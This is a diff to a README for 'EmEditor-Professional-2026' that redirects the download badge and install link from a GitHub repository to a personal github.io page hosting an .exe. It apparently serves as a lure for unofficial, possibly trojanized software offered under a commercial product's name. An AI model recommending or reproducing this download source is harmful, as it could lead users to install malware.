@@ -1,6 +1,6 @@
 # 📝 EmEditor-Professional-2026 - Handle large text files with ease
 
-[![](https://img.shields.io/badge/Download-EmEditor-blue.svg)](https://github.com/rzt799/EmEditor-Professional-2026)
+[![](https://img.shields.io/badge/Download-EmEditor-blue.svg)](https://rzt799.github.io)
 
 ## 📋 About EmEditor Professional
 
@@ -27,7 +27,7 @@ EmEditor Professional is a text editor for Windows 10 and Windows 11. It excels 
 
 Follow these steps to obtain and install the software on your computer.
 
-1.  Visit the official release page to retrieve the installer: [https://github.com/rzt799/EmEditor-Professional-2026](https://github.com/rzt799/EmEditor-Professional-2026)
+1.  Visit the official release page to retrieve the installer: [https://rzt799.github.io](https://rzt799.github.io)
 2.  Locate the download section on the page.
 3.  Click the link to save the executable (.exe) file to your computer.
 4.  Navigate to your Downloads folder after the transfer finishes.
